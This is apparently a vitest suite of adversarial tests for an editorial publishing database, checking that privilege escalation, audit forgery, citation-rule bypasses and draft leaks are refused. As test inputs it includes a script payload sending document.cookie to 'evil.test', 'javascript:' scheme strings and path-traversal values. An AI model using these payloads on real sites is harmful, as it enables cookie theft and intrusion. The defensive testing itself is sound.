import { beforeAll, describe, expect, it } from "vitest";
import type { PGlite } from "@electric-sql/pglite";
import { asUser, createTestDatabase, createUser, expectSqlError, sha256 } from "./db";

/**
 * Adversarial tests for stage 2c: attempts to break the editorial rules rather
 * than confirm them. Each case is something an attacker — or a careless future
 * caller — would actually try.
 *
 * Every assertion here is a refusal. If one of these ever starts passing, a
 * guarantee the product makes to its readers has been lost.
 */

let db: PGlite;
let analyst: string;
let editor: string;

beforeAll(async () => {
  db = await createTestDatabase();
  analyst = await createUser(db, { staff: ["analyst"] });
  editor = await createUser(db, { staff: ["editor"] });
}, 60_000);

let n = 0;

async function approvedDocument(): Promise<string> {
  n += 1;
  const { rows } = await db.query<{ id: string }>(
    `select public.record_uploaded_document(
       $1, 'companies.documents', 'issuer_ir', 'annual_report', $2, $3, $4,
       'application/pdf', 2048, 'issuer_document', null, $5
     ) as id`,
    [analyst, `Attack source ${n}`, `aa/atk-${n}.pdf`, sha256(`atk-${n}`), `https://issuer.test/atk-${n}.pdf`],
  );
  await db.query("select public.review_document($1, $2, 'approved')", [rows[0].id, editor]);
  return rows[0].id;
}

async function publishedArticle(slug?: string): Promise<string> {
  n += 1;
  const { rows } = await db.query<{ id: string }>(
    `insert into public.editorial_items (kind, slug, title, body_text, author_id)
     values ('article', $1, $2, 'Body.', $3) returning id`,
    [slug ?? `attack-${n}`, `Attack ${n}`, analyst],
  );
  await db.query(
    "insert into public.editorial_citations (item_id, claim, document_id) values ($1, 'claim', $2)",
    [rows[0].id, await approvedDocument()],
  );
  await db.query("select public.publish_editorial_item($1, $2)", [rows[0].id, editor]);
  return rows[0].id;
}

describe("attack: forge or escalate privilege", () => {
  it("a reader cannot publish, correct or withdraw", async () => {
    const item = await publishedArticle();
    const reader = await createUser(db);

    expect((await expectSqlError(db.query("select public.publish_editorial_item($1, $2)", [item, reader]))).code).toBe("42501");
    expect(
      (await expectSqlError(db.query("select public.withdraw_editorial_item($1, $2, 'mine now')", [item, reader]))).code,
    ).toBe("42501");
  });

  it("a fact_checker cannot publish or withdraw", async () => {
    const item = await publishedArticle();
    const factChecker = await createUser(db, { staff: ["fact_checker"] });

    expect(
      (await expectSqlError(db.query("select public.publish_editorial_item($1, $2)", [item, factChecker]))).code,
    ).toBe("42501");
    expect(
      (await expectSqlError(db.query("select public.withdraw_editorial_item($1, $2, 'x')", [item, factChecker]))).code,
    ).toBe("42501");
  });

  it("a signed-in client cannot write editorial rows directly, whatever their role", async () => {
    const admin = await createUser(db, { admin: true });
    for (const actor of [analyst, editor, admin]) {
      const error = await asUser(db, actor, () =>
        expectSqlError(
          db.query(
            `insert into public.editorial_items (kind, slug, title, body_text) values ('article', 'forged-item', 'Forged', 'Body.')`,
          ),
        ),
      );
      expect(error.code).toBe("42501");
    }
  });

  it("a signed-in client cannot forge an audit entry", async () => {
    // The audit log is the record this stage relies on. If a client could write
    // to it, every "who did what" claim would be worthless.
    const error = await asUser(db, editor, () =>
      expectSqlError(
        db.query(
          "insert into public.audit_logs (actor_user_id, action, details) values ($1, 'editorial.published', '{}'::jsonb)",
          [editor],
        ),
      ),
    );
    expect(error.code).toBe("42501");
  });

  it("an item cannot be reattributed to another author", async () => {
    const item = await publishedArticle();
    const error = await expectSqlError(
      db.query("update public.editorial_items set author_id = $1 where id = $2", [editor, item]),
    );
    expect(error.code).toBe("42501");
  });
});

describe("attack: set the session flag and write directly", () => {
  it("a signed-in client gains nothing by setting the guard's flag", async () => {
    const item = await publishedArticle();

    // The guard keys off a session setting. Any role may set a custom GUC, so
    // the flag alone must not be enough — the table grants are what hold.
    const error = await asUser(db, editor, async () => {
      await db.query("select set_config('sfi.editorial_write', '1', false)");
      return expectSqlError(
        db.query("update public.editorial_items set status = 'withdrawn' where id = $1", [item]),
      );
    });

    expect(error.code).toBe("42501");
    await db.query("select set_config('sfi.editorial_write', '0', false)");
  });
});

describe("attack: bypass the publication rules", () => {
  it("an article cannot be published with its citations stripped first", async () => {
    n += 1;
    const { rows } = await db.query<{ id: string }>(
      `insert into public.editorial_items (kind, slug, title, body_text, author_id)
       values ('article', $1, 'Stripped', 'Body.', $2) returning id`,
      [`stripped-${n}`, analyst],
    );
    const item = rows[0].id;
    await db.query("insert into public.editorial_citations (item_id, claim, document_id) values ($1, 'c', $2)", [
      item,
      await approvedDocument(),
    ]);
    // Removing them while still a draft is allowed; publishing then must fail.
    await db.query("delete from public.editorial_citations where item_id = $1", [item]);

    const error = await expectSqlError(db.query("select public.publish_editorial_item($1, $2)", [item, editor]));
    expect(error.code).toBe("23514");
  });

  it("a citation cannot rest on a withdrawn announcement", async () => {
    const doc = await approvedDocument();
    const { rows: ann } = await db.query<{ id: string }>(
      `select public.publish_announcement($1, $2, 'results', 'Headline', now() - interval '1 hour') as id`,
      [analyst, doc],
    );
    await db.query("select public.withdraw_announcement($1, $2, 'Retracted')", [ann[0].id, editor]);

    n += 1;
    const { rows } = await db.query<{ id: string }>(
      `insert into public.editorial_items (kind, slug, title, body_text, author_id)
       values ('article', $1, 'Cites withdrawn', 'Body.', $2) returning id`,
      [`cites-withdrawn-${n}`, analyst],
    );
    const error = await expectSqlError(
      db.query("insert into public.editorial_citations (item_id, claim, announcement_id) values ($1, 'c', $2)", [
        rows[0].id,
        ann[0].id,
      ]),
    );
    expect(error.code).toBe("23514");
  });

  it("a published item cannot be dragged back to draft to make it editable again", async () => {
    const item = await publishedArticle();
    const error = await expectSqlError(
      db.query("update public.editorial_items set status = 'draft' where id = $1", [item]),
    );
    expect(error.code).toBe("42501");
  });

  it("a published item cannot be superseded by editing its pointer afterwards", async () => {
    const item = await publishedArticle();
    const other = await publishedArticle();
    const error = await expectSqlError(
      db.query("update public.editorial_items set supersedes_id = $1 where id = $2", [other, item]),
    );
    expect(error.code).toBe("23514");
  });

  it("a draft cannot correct a withdrawn item, nor take its address", async () => {
    const original = await publishedArticle("contested-slug");
    await db.query("select public.withdraw_editorial_item($1, $2, 'Retracted')", [original, editor]);

    n += 1;
    const { rows } = await db.query<{ id: string }>(
      `insert into public.editorial_items (kind, slug, title, body_text, author_id, supersedes_id, correction_reason)
       values ('article', 'contested-slug', 'Taking over', 'Body.', $1, $2, 'because') returning id`,
      [analyst, original],
    );
    await db.query("insert into public.editorial_citations (item_id, claim, document_id) values ($1, 'c', $2)", [
      rows[0].id,
      await approvedDocument(),
    ]);

    const error = await expectSqlError(db.query("select public.publish_editorial_item($1, $2)", [rows[0].id, editor]));
    expect(error.code).toBe("23514");
  });

  it("the same draft cannot be published twice", async () => {
    const item = await publishedArticle();
    const error = await expectSqlError(db.query("select public.publish_editorial_item($1, $2)", [item, editor]));
    expect(error.code).toBe("23514");
  });

  it("an AI-assisted item cannot hide which model wrote it", async () => {
    n += 1;
    const error = await expectSqlError(
      db.query(
        `insert into public.editorial_items (kind, slug, title, body_text, ai_assisted)
         values ('article', $1, 'Unlabelled', 'Body.', true)`,
        [`unlabelled-${n}`],
      ),
    );
    expect(error.code).toBe("23514");
  });
});

describe("attack: smuggle a hostile value into a rendered attribute", () => {
  it("no scheme other than a bare YouTube id survives the video column", async () => {
    for (const videoId of [
      "javascript:a",
      "data:text/ht",
      "'\"><script>",
      "../../../etc",
      "%2e%2e%2f%2e",
      "aaaaaaaaaaa ",
    ]) {
      n += 1;
      const error = await expectSqlError(
        db.query(
          `insert into public.editorial_items (kind, slug, title, video_id, guest_name)
           values ('video', $1, 'Hostile', $2, 'Guest')`,
          [`hostile-video-${n}`, videoId],
        ),
      );
      expect(error.code).toBe("23514");
    }
  });

  it("no slug can carry a scheme, a path or a traversal into a URL", async () => {
    for (const slug of ["javascript:x", "../../admin", "a/../../b", "a?b=c", "a#b", "a%00b"]) {
      const error = await expectSqlError(
        db.query(
          `insert into public.editorial_items (kind, slug, title, body_text) values ('article', $1, 'T', 'Body.')`,
          [slug],
        ),
      );
      expect(error.code).toBe("23514");
    }
  });

  it("hostile prose is stored verbatim and stays data, never markup", async () => {
    // React renders this into a text node. The point of the test is that nothing
    // in the pipeline tries to interpret it, so there is no sanitiser to defeat.
    const payload = "<script>fetch('https://evil.test?c='+document.cookie)</script>";
    n += 1;
    const { rows } = await db.query<{ id: string }>(
      `insert into public.editorial_items (kind, slug, title, body_text, author_id)
       values ('article', $1, $2, $3, $4) returning id`,
      [`payload-${n}`, payload, payload, analyst],
    );
    const { rows: stored } = await db.query<{ body_text: string; title: string }>(
      "select body_text, title from public.editorial_items where id = $1",
      [rows[0].id],
    );
    expect(stored[0].body_text).toBe(payload);
    expect(stored[0].title).toBe(payload);
  });
});

describe("attack: read what should not be readable", () => {
  it("a reader cannot see a draft, nor reach it by guessing its slug", async () => {
    n += 1;
    await db.query(
      `insert into public.editorial_items (kind, slug, title, body_text, author_id)
       values ('article', 'secret-embargoed-story', 'Embargoed', 'Market moving.', $1)`,
      [analyst],
    );
    const reader = await createUser(db);

    const found = await asUser(db, reader, async () => {
      const { rows } = await db.query("select id from public.editorial_items where slug = 'secret-embargoed-story'");
      return rows.length;
    });
    expect(found).toBe(0);
  });

  it("editorial_item_is_live leaks nothing about a draft", async () => {
    n += 1;
    const { rows } = await db.query<{ id: string }>(
      `insert into public.editorial_items (kind, slug, title, body_text) values ('article', $1, 'Hidden', 'Body.') returning id`,
      [`probe-${n}`],
    );
    const reader = await createUser(db);

    const live = await asUser(db, reader, async () => {
      const { rows: r } = await db.query<{ v: boolean }>("select public.editorial_item_is_live($1) as v", [rows[0].id]);
      return r[0].v;
    });
    expect(live).toBe(false);
  });
});

describe("attack: the hardening added after review", () => {
  it("an item cannot be born published, skipping the role check and the audit entry", async () => {
    n += 1;
    const error = await expectSqlError(
      db.query(
        `insert into public.editorial_items (kind, slug, title, body_text, status, published_at, published_by, version)
         values ('article', $1, 'Born live', 'Body.', 'published', now(), $2, 3)`,
        [`born-live-${n}`, editor],
      ),
    );
    expect(error.code).toBe("42501");
  });

  it("a citation cannot be moved off a published item onto a draft", async () => {
    const published = await publishedArticle();
    n += 1;
    const { rows: draft } = await db.query<{ id: string }>(
      `insert into public.editorial_items (kind, slug, title, body_text, author_id)
       values ('article', $1, 'Destination', 'Body.', $2) returning id`,
      [`destination-${n}`, analyst],
    );
    const { rows: citation } = await db.query<{ id: string }>(
      "select id from public.editorial_citations where item_id = $1 limit 1",
      [published],
    );

    // The delete guard blocks removal; moving it would have achieved the same
    // thing while being judged only on where it was going.
    const error = await expectSqlError(
      db.query("update public.editorial_citations set item_id = $1 where id = $2", [draft[0].id, citation[0].id]),
    );
    expect(error.code).toBe("42501");
  });

  it("a citation cannot rest on a document readers are not allowed to open", async () => {
    n += 1;
    const { rows: doc } = await db.query<{ id: string }>(
      `select public.record_uploaded_document(
         $1, 'companies.documents', 'issuer_ir', 'annual_report', 'Unverified licence', $2, $3,
         'application/pdf', 2048, 'unverified', null, 'https://issuer.test/unverified.pdf'
       ) as id`,
      [analyst, `aa/unver-${n}.pdf`, sha256(`unver-${n}`)],
    );
    await db.query("select public.review_document($1, $2, 'approved')", [doc[0].id, editor]);

    const { rows: item } = await db.query<{ id: string }>(
      `insert into public.editorial_items (kind, slug, title, body_text, author_id)
       values ('article', $1, 'Cites unreachable', 'Body.', $2) returning id`,
      [`unreachable-${n}`, analyst],
    );

    const error = await expectSqlError(
      db.query("insert into public.editorial_citations (item_id, claim, document_id) values ($1, 'c', $2)", [
        item[0].id,
        doc[0].id,
      ]),
    );
    expect(error.code).toBe("23514");
  });

  it("clearing the author does not let an item claim independent review", async () => {
    n += 1;
    const { rows } = await db.query<{ id: string }>(
      `insert into public.editorial_items (kind, slug, title, body_text, author_id)
       values ('article', $1, 'Orphaned', 'Body.', $2) returning id`,
      [`orphaned-${n}`, analyst],
    );
    await db.query("insert into public.editorial_citations (item_id, claim, document_id) values ($1, 'c', $2)", [
      rows[0].id,
      await approvedDocument(),
    ]);
    await db.query("update public.editorial_items set author_id = null where id = $1", [rows[0].id]);

    await db.query("select public.publish_editorial_item($1, $2)", [rows[0].id, editor]);

    const { rows: after } = await db.query<{ self_reviewed: boolean }>(
      "select self_reviewed from public.editorial_items where id = $1",
      [rows[0].id],
    );
    // Unknown authorship is not evidence that someone else read it.
    expect(after[0].self_reviewed).toBe(true);
  });
});
